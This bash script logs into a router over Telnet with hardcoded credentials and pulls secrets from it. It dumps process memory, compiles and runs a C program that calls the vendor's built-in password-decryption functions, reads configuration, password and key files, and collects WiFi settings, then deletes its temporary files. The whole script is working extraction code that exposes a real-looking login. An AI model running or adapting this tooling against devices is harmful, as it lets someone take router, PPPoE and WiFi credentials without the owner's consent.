#!/bin/bash

# Direct Telnet Key Extraction Script
# Connects to router and extracts encryption keys via Telnet

ROUTER_IP="192.168.1.1"
USERNAME="sUser"
PASSWORD="EP!99R4HLH9E"
OUTPUT_DIR="/home/recep/Masaüstü/Firmware/telnet_extraction"

echo "=== Telnet Router Key Extraction ==="
echo "Router: $ROUTER_IP"
echo "User: $USERNAME"
echo "Output: $OUTPUT_DIR"
echo

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Function to execute Telnet command
telnet_exec() {
    local cmd="$1"
    local timeout="${2:-30}"
    
    {
        sleep 2
        echo "$USERNAME"
        sleep 2
        echo "$PASSWORD"
        sleep 3
        echo "$cmd"
        sleep 5
        echo "exit"
    } | timeout "$timeout" telnet "$ROUTER_IP" 2>/dev/null | grep -v "login:" | grep -v "Password:" | grep -v "exit"
}

# Test connection
echo "[*] Testing Telnet connection..."
test_result=$(telnet_exec "echo 'CONNECTION_OK'" 15)
if echo "$test_result" | grep -q "CONNECTION_OK"; then
    echo "[+] Telnet connection successful!"
else
    echo "[-] Telnet connection failed"
    exit 1
fi

# 1. Get system information
echo "[*] Gathering system information..."
telnet_exec "uname -a" > "$OUTPUT_DIR/uname.txt"
telnet_exec "ps aux" > "$OUTPUT_DIR/processes.txt"
telnet_exec "cat /proc/version" > "$OUTPUT_DIR/version.txt"
telnet_exec "cat /proc/cmdline" > "$OUTPUT_DIR/cmdline.txt"

# 2. Find crypto processes
echo "[*] Finding crypto processes..."
telnet_exec "ps aux | grep -E 'smp|crypto|cipher|decrypt|encrypt|capi'" > "$OUTPUT_DIR/crypto_processes.txt"

# Extract PIDs of crypto processes
crypto_pids=$(telnet_exec "for pid in \$(ls /proc | grep -E '^[0-9]+\$'); do if [ -f \"/proc/\$pid/cmdline\" ]; then cmdline=\$(cat /proc/\$pid/cmdline | tr '\\0' ' '); if echo \"\$cmdline\" | grep -qiE 'crypto|cipher|decrypt|encrypt|smp|capi'; then echo \$pid; fi; done" | head -10)

echo "  Found crypto PIDs: $crypto_pids"

# 3. Analyze process memory for keys
echo "[*] Analyzing process memory..."
for pid in $crypto_pids; do
    if [ -n "$pid" ]; then
        echo "  [*] Analyzing PID: $pid"
        
        # Get process info
        telnet_exec "cat /proc/$pid/cmdline" > "$OUTPUT_DIR/cmdline_$pid.txt"
        
        # Get memory maps
        telnet_exec "cat /proc/$pid/maps" > "$OUTPUT_DIR/maps_$pid.txt"
        
        # Try to dump memory regions
        echo "    [*] Attempting memory dump..."
        
        # Look for readable memory regions
        readable_regions=$(telnet_exec "cat /proc/$pid/maps | grep 'rw-' | head -5")
        
        if [ -n "$readable_regions" ]; then
            echo "      Found readable memory regions"
            
            # Try to dump from stack/heap regions
            telnet_exec "
            if [ -r /proc/$pid/mem ]; then
                # Try to dump small chunks from different offsets
                for offset in 0x1000 0x10000 0x100000 0x1000000; do
                    echo \"Dumping from offset \$offset...\"
                    dd if=/proc/$pid/mem bs=1 skip=\$offset count=1024 2>/dev/null | strings -n 16 | head -10
                    echo \"---\"
                done
            else
                echo \"Memory not readable\"
            fi
            " > "$OUTPUT_DIR/memory_dump_$pid.txt"
        fi
    fi
done

# 4. Trigger crypto operations and capture keys
echo "[*] Triggering crypto operations..."
telnet_exec "
# Create crypto trigger script
cat > /tmp/crypto_trigger.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

int HW_Mobilemng_SetTaskSource() { return 0; }
int SRV_COMM_GetNewExportType() { return 0; }
void* SRV_COMM_GetExportValue() { return NULL; }
void* CAPI_SMP_GetWanInterfaceStatus() { return NULL; }

int main() {
    void *handle;
    int (*decrypt_func)(const char*, char*);
    char output[1024];
    
    printf(\"Starting crypto operations...\n\");
    
    // Load primary crypto library
    handle = dlopen(\"/lib/libhw_smp_capi.so\", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, \"CAPI_SMP_DecryptCipherText\");
        if (decrypt_func) {
            printf(\"Testing CAPI_SMP_DecryptCipherText...\n\");
            decrypt_func(\"test_password_123\", output);
            printf(\"Result: %s\n\", output);
            
            decrypt_func(\"admin\", output);
            printf(\"Result: %s\n\", output);
            
            decrypt_func(\"superonline\", output);
            printf(\"Result: %s\n\", output);
        }
        dlclose(handle);
    }
    
    // Load fallback crypto library
    handle = dlopen(\"/lib/libl3_base_api.so\", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, \"WAN_IF_DecryptPPPoEPassWord\");
        if (decrypt_func) {
            printf(\"Testing WAN_IF_DecryptPPPoEPassWord...\n\");
            decrypt_func(\"pppoe_test\", output);
            printf(\"Result: %s\n\", output);
        }
        dlclose(handle);
    }
    
    return 0;
}
EOF

# Try to compile
gcc -o /tmp/crypto_trigger /tmp/crypto_trigger.c -ldl 2>/dev/null
if [ -f /tmp/crypto_trigger ]; then
    echo \"Crypto trigger compiled successfully\"
    # Run in background
    /tmp/crypto_trigger &
    TRIGGER_PID=\$!
    echo \"Trigger PID: \$TRIGGER_PID\"
    
    # Wait a bit for crypto operations
    sleep 5
    
    # Try to dump memory while crypto is running
    if [ -r /proc/\$TRIGGER_PID/mem ]; then
        echo \"Dumping crypto process memory...\"
        dd if=/proc/\$TRIGGER_PID/mem bs=1024 count=100 2>/dev/null | strings -n 16 > /tmp/crypto_memory_dump.txt
        echo \"Memory dump saved\"
        
        # Look for keys in the dump
        echo \"Searching for keys in memory dump...\"
        grep -E '[A-Fa-f0-9]{32}|[A-Za-z0-9+/]{32}=' /tmp/crypto_memory_dump.txt | head -10
    fi
    
    # Kill the trigger process
    kill \$TRIGGER_PID 2>/dev/null
    rm -f /tmp/crypto_trigger /tmp/crypto_trigger.c /tmp/crypto_memory_dump.txt
else
    echo \"Failed to compile crypto trigger\"
fi
" > "$OUTPUT_DIR/crypto_trigger_result.txt"

# 5. Extract configuration files with passwords
echo "[*] Extracting configuration passwords..."
telnet_exec "
# Find all config files
find /etc -name '*.conf' -exec echo '=== {} ===' \; -exec cat {} \; 2>/dev/null | head -200
" > "$OUTPUT_DIR/config_files.txt"

telnet_exec "
# Find password files
find /etc -name '*password*' -o -name '*secret*' -o -name '*key*' 2>/dev/null | while read file; do
    echo \"=== \$file ===\"
    cat \"\$file\" 2>/dev/null
    echo
done
" > "$OUTPUT_DIR/password_files.txt"

telnet_exec "
# Check UCI configuration
uci show 2>/dev/null | grep -i password | head -20
" > "$OUTPUT_DIR/uci_passwords.txt"

telnet_exec "
# Check environment variables
env | grep -iE 'password|key|secret' | head -20
" > "$OUTPUT_DIR/env_passwords.txt"

# 6. Check for busybox and install if needed
echo "[*] Checking for busybox..."
busybox_check=$(telnet_exec "which busybox")
if echo "$busybox_check" | grep -q "not found\|no busybox"; then
    echo "  [-] busybox not found"
    echo "  [*] You can install busybox via USB:"
    echo "      1. Download busybox binary"
    echo "      2. Copy to USB drive"
    echo "      3. Insert USB into router"
    echo "      4. Mount USB: mount /dev/sda1 /mnt"
    echo "      5. Copy busybox: cp /mnt/busybox /tmp/"
    echo "      6. Make executable: chmod +x /tmp/busybox"
else
    echo "  [+] busybox is available"
fi

# 7. Extract WiFi passwords
echo "[*] Extracting WiFi passwords..."
telnet_exec "
# Check wireless configuration
find /etc -name '*wireless*' -exec cat {} \; 2>/dev/null | head -100
" > "$OUTPUT_DIR/wifi_config.txt"

telnet_exec "
# Check hostapd configuration
find /tmp -name '*hostapd*' -exec cat {} \; 2>/dev/null | head -50
" > "$OUTPUT_DIR/hostapd_config.txt"

# 8. Create summary
echo "[*] Creating extraction summary..."
cat > "$OUTPUT_DIR/extraction_summary.txt" << EOF
=== Telnet Router Key Extraction Summary ===
Date: $(date)
Router IP: $ROUTER_IP
Username: $USERNAME

=== Files Extracted ===
- uname.txt: System information
- processes.txt: Running processes
- crypto_processes.txt: Crypto-related processes
- cmdline_*.txt: Process command lines
- maps_*.txt: Process memory maps
- memory_dump_*.txt: Process memory dumps
- crypto_trigger_result.txt: Crypto operation trigger results
- config_files.txt: Configuration files
- password_files.txt: Password-related files
- uci_passwords.txt: UCI password configuration
- env_passwords.txt: Environment variables with passwords
- wifi_config.txt: Wireless configuration
- hostapd_config.txt: HostAPD configuration

=== Crypto PIDs Found ===
$crypto_pids

=== Key Search Results ===
Search all extracted files for potential encryption keys:
- Hex keys (32+ chars): \$(grep -rE '[A-Fa-f0-9]{32}' "$OUTPUT_DIR" | wc -l)
- Base64 keys: \$(grep -rE '[A-Za-z0-9+/]{32}=' "$OUTPUT_DIR" | wc -l)
- Password entries: \$(grep -r -i 'password\|key\|secret' "$OUTPUT_DIR" | wc -l)

=== Next Steps ===
1. Review memory_dump_*.txt files for encryption keys
2. Check crypto_trigger_result.txt for live crypto operations
3. Analyze password files for encrypted passwords
4. Test decryption functions with extracted encrypted strings

EOF

echo
echo "[+] Telnet key extraction completed!"
echo "[*] Results saved to: $OUTPUT_DIR"
echo "[*] Summary: $OUTPUT_DIR/extraction_summary.txt"

# Show some quick findings
echo
echo "=== Quick Findings ==="
echo "Crypto processes found: $(echo "$crypto_pids" | wc -w)"
echo "Files extracted: $(ls -1 "$OUTPUT_DIR" | wc -l)"

# Look for any immediate key findings
if [ -f "$OUTPUT_DIR/memory_dump_"* ]; then
    echo "Memory dumps created:"
    ls -la "$OUTPUT_DIR"/memory_dump_*.txt 2>/dev/null | head -5
fi

if [ -f "$OUTPUT_DIR/crypto_trigger_result.txt" ]; then
    echo "Crypto trigger results:"
    head -20 "$OUTPUT_DIR/crypto_trigger_result.txt"
fi

echo
echo "Extraction complete. Review files in $OUTPUT_DIR for detailed analysis."
